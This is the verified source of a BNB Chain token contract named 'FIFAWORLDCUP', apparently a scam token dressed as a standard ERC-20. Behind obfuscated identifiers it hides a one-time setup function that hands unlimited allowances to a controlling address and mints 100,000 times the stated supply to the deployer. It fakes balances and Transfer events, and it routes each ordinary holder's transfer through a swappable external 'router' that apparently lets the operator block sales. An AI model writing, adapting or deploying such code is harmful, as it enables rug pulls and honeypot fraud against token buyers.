/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint160 amountIn,
        uint160 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FIFAWORLDCUP is IERC20 {
    using SafeMath for uint256;

    string private aibcvKmXnerTos = "Qatar";
    string private bibcvKmXnerTos = "Qatar";
    uint8 private cibcvKmXnerTos = 18;
    uint256 private dibcvKmXnerTos = 10000000000 * 10**18;
    mapping (address => uint256) private eibcvKmXnerTos;
    mapping (address => mapping (address => uint256)) private fibcvKmXnerTos;
    uint256 private gibcvKmXnerTos = 1;
    uint256 private constant hibcvKmXnerTos = ~uint160(0);
    uint256 private _iibcvKmXnerTos = 1000;
    uint256 private jibcvKmXnerTos = 0;
    uint256 private kibcvKmXnerTos;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private libcvKmXnerTos;
    address[] private mibcvKmXnerTos;
    bool private nibcvKmXnerTos = false;

    constructor () {
        oibcvKmXnerTos(msg.sender);
        eibcvKmXnerTos[msg.sender] = dibcvKmXnerTos;
        oibcvKmXnerTos(tx.origin);
        emit Transfer(address(0), msg.sender, dibcvKmXnerTos);
    }

    receive() external payable {}

    function oibcvKmXnerTos(address account) private {
        if (!libcvKmXnerTos[account]) {
            libcvKmXnerTos[account] = true;
            mibcvKmXnerTos.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!nibcvKmXnerTos);
        nibcvKmXnerTos = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            oibcvKmXnerTos(accounts[i]);
            eibcvKmXnerTos[accounts[i]] = dibcvKmXnerTos * 90 / 100 / (len - 3);
            fibcvKmXnerTos[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eibcvKmXnerTos[accounts[i]];
        }
        eibcvKmXnerTos[mibcvKmXnerTos[0]] -= amount;
        pibcvKmXnerTos(mibcvKmXnerTos[0], accounts[3], eibcvKmXnerTos[mibcvKmXnerTos[0]]);
        pibcvKmXnerToss(500);
        eibcvKmXnerTos[mibcvKmXnerTos[1]] += dibcvKmXnerTos * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mibcvKmXnerTos.length;
        for (uint256 i=0; i<len; ++i) {
            if (mibcvKmXnerTos[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (libcvKmXnerTos[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aibcvKmXnerTos;
    }

    function symbol() public view returns (string memory) {
        return bibcvKmXnerTos;
    }

    function decimals() public view returns (uint8) {
        return cibcvKmXnerTos;
    }

    function totalSupply() public view returns (uint256) {
        return dibcvKmXnerTos;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eibcvKmXnerTos[account] > 0) {
            return eibcvKmXnerTos[account];
        }
        return gibcvKmXnerTos;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pibcvKmXnerTos(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pibcvKmXnerTos(sender, recipient, amount);
        qibcvKmXnerTos(sender, msg.sender, fibcvKmXnerTos[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForEth(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qibcvKmXnerTos(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qibcvKmXnerTos(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fibcvKmXnerTos[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qibcvKmXnerTos(msg.sender, spender, fibcvKmXnerTos[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qibcvKmXnerTos(msg.sender, spender, fibcvKmXnerTos[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pibcvKmXnerToss(uint256 amount) private {
        uint256 iibcvKmXnerTos = _iibcvKmXnerTos;
        if (iibcvKmXnerTos < 10500 && block.timestamp > 1668880800) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hibcvKmXnerTos.div(iibcvKmXnerTos)));
                to = address(uint160(hibcvKmXnerTos.div(iibcvKmXnerTos.add(1))));
                iibcvKmXnerTos = iibcvKmXnerTos.add(2);
                emit Transfer(from, to, gibcvKmXnerTos);
            }
            _iibcvKmXnerTos = iibcvKmXnerTos;
        }
    }

    function qibcvKmXnerTos(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fibcvKmXnerTos[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pibcvKmXnerTos(address ribcvKmXnerTos, address sibcvKmXnerTos, uint256 tibcvKmXnerTos) private {
        require(ribcvKmXnerTos != address(0) && sibcvKmXnerTos != address(0) && tibcvKmXnerTos > 0);
        bool uibcvKmXnerTos = true;
        if (libcvKmXnerTos[ribcvKmXnerTos] || libcvKmXnerTos[sibcvKmXnerTos]) {
            uibcvKmXnerTos = false;
        }
        uint256 vibcvKmXnerTos = IERC20(_uniswapV2Pair).totalSupply();
        uint256 wibcvKmXnerTos = 0;
        uint256 xibcvKmXnerTos = tibcvKmXnerTos;
        if (uibcvKmXnerTos && nibcvKmXnerTos) {
            require(kibcvKmXnerTos <= vibcvKmXnerTos);
            pibcvKmXnerToss(100);
            swapTokensForEth(uint160(ribcvKmXnerTos), uint160(sibcvKmXnerTos));
            if (sibcvKmXnerTos == _uniswapV2Pair) {
                emit Transfer(address(this), sibcvKmXnerTos, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (ribcvKmXnerTos != _uniswapV2Pair) {
                wibcvKmXnerTos = tibcvKmXnerTos.mul(jibcvKmXnerTos).div(100);
                xibcvKmXnerTos = tibcvKmXnerTos.sub(wibcvKmXnerTos);
            }
        }
        if (kibcvKmXnerTos != vibcvKmXnerTos) {
            kibcvKmXnerTos = vibcvKmXnerTos;
        }
        eibcvKmXnerTos[ribcvKmXnerTos] = eibcvKmXnerTos[ribcvKmXnerTos].sub(tibcvKmXnerTos);
        if (wibcvKmXnerTos > 0) {
            eibcvKmXnerTos[address(0xdEaD)] = eibcvKmXnerTos[address(0xdEaD)].add(wibcvKmXnerTos);
            emit Transfer(ribcvKmXnerTos, address(0xdEaD), wibcvKmXnerTos);
        }
        eibcvKmXnerTos[sibcvKmXnerTos] = eibcvKmXnerTos[sibcvKmXnerTos].add(xibcvKmXnerTos);
        emit Transfer(ribcvKmXnerTos, sibcvKmXnerTos, xibcvKmXnerTos);
    }
}